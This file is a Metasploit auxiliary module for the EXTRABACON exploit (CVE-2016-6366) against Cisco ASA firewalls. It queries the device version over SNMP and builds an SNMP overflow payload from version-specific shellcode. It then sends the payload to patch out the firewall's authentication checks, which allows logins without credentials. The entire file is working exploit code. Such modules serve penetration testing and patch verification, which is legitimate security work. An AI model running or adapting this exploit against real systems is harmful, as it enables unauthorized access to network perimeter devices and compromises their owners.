##
# auxiliary/admin/cisco/cisco_asa_extrabacon.rb
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Cisco

  def initialize
    super(
      'Name'        => 'Cisco ASA Authentication Bypass (EXTRABACON)',
      'Description' => %q{
          This module patches the authentication functions of a Cisco ASA
          to allow uncredentialed logins. Uses improved shellcode for payload.
        },
      'Author'      =>
        [
          'Sean Dillon <sean.dillon@risksense.com>',
          'Zachary Harding <zachary.harding@risksense.com>',
          'Nate Caroe <nate.caroe@risksense.com>',
          'Dylan Davis <dylan.davis@risksense.com>',
          'Equation Group',
          'Shadow Brokers'
        ],
      'References' =>
        [
          [ 'CVE', '2016-6366'],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp'],
        ],
      'License'     => MSF_LICENSE
    )
    register_options([
      OptEnum.new('MODE', [ true, 'Enable or disable the password auth functions', 'pass-disable', ['pass-disable', 'pass-enable']])
    ], self.class)
    deregister_options("VERSION")

    $shellcode = {

      "9.2(3)" => ["29.112.29.8",   # jmp_esp_offset, 0
                   "134.115.39.9",  # saferet_offset, 1
                   "72",            # fix_ebp,        2
                   "0.128.183.9",   # pmcheck_bounds, 3
                   "16.128.183.9",  # pmcheck_offset, 4
                   "85.49.192.137", # pmcheck_code,   5
                   "0.80.8.8",      # admauth_bounds, 6
                   "64.90.8.8",     # admauth_offset, 7
                   "85.137.229.87", # admauth_code,   8
                   "49.192.64.195"] # patched_code,   9
    }
  end

  def setup

  end

  def cleanup
    # Cleanup is called once for every single thread
  end

  def fw_version_check(vers_string)
    version = vers_string.split(" ").last
    return version
  end

  def check
    datastore['VERSION'] = '2c' # 2c required it seems

    snmp = connect_snmp
    begin
      vers_string = snmp.get_value('1.3.6.1.2.1.47.1.1.1.1.10.1').to_s
    rescue ::Exception => e
      print_error("Error: Unable to retrieve version information")
      return Exploit::CheckCode::Unknown
    end

    asa_vers = fw_version_check(vers_string)

    if $shellcode[asa_vers]
      print_status("Payload for Cisco ASA version #{asa_vers} available")
      return Exploit::CheckCode::Appears
    end

    print_warning("Received Cisco ASA version #{asa_vers}, but no payload available")
    return Exploit::CheckCode::Detected
  end

  def build_shellcode(asa_vers, mode)
      if mode == 'pass-disable'
          pmcheck_bytes = $shellcode[asa_vers][9]
          admauth_bytes = $shellcode[asa_vers][9]
      else
          pmcheck_bytes = $shellcode[asa_vers][5]
          admauth_bytes = $shellcode[asa_vers][8]
      end

      preamble_snmp = ""
      preamble_snmp += "49.219.49.246.49.201.49.192.96.49.210.128.197.16.128.194.7.4.125.80.187."
      preamble_snmp += $shellcode[asa_vers][3]
      preamble_snmp += ".205.128.88.187."
      preamble_snmp += $shellcode[asa_vers][6]
      preamble_snmp += ".205.128.199.5."
      preamble_snmp += $shellcode[asa_vers][4]
      preamble_snmp += "."
      preamble_snmp += pmcheck_bytes
      preamble_snmp += ".199.5."
      preamble_snmp += $shellcode[asa_vers][7]
      preamble_snmp += "."
      preamble_snmp += admauth_bytes
      preamble_snmp += ".97.104."
      preamble_snmp += $shellcode[asa_vers][1]
      preamble_snmp += ".128.195.16.191.11.15.15.15.137.229.131.197."
      preamble_snmp += $shellcode[asa_vers][2]
      preamble_snmp += ".195"

      wrapper = preamble_snmp

      wrapper_len = wrapper.split('.').length
      wrapper += ".144" * (82 - wrapper_len)

      # cufwUrlfServerStatus
      head = "1.3.6.1.4.1.9.9.491.1.3.3.1.1.5."

      head += "9.95"
      finder_snmp = "139.124.36.20.139.7.255.224.144"

      overflow = [head, wrapper, $shellcode[asa_vers][0], finder_snmp].join(".")
      return overflow
  end

  def run()

    begin
      datastore['VERSION'] = '2c' # 2c required it seems
      mode = datastore['MODE']

      session = rand(255) + 1

      snmp = connect_snmp

      vers_string = snmp.get_value('1.3.6.1.2.1.47.1.1.1.1.10.1').to_s
      asa_vers = fw_version_check(vers_string)

      print_status("Building payload for #{mode}...")

      overflow = build_shellcode(asa_vers, mode)
      payload = SNMP::ObjectId.new(overflow)

      print_status("Sending SNMP payload...")

      response = snmp.get_bulk(0, 1, [SNMP::VarBind.new(payload)])

      if response.varbind_list
        print_good("Clean return detected!")
        if mode == 'pass-disable'
          print_warning("Don't forget to run pass-enable after logging in!")
        end
      end

    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
      print_error("SNMP Error, Cisco ASA may have crashed :/")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Error: #{e.class} #{e} #{e.backtrace}")
    ensure
      disconnect_snmp
    end
  end

end
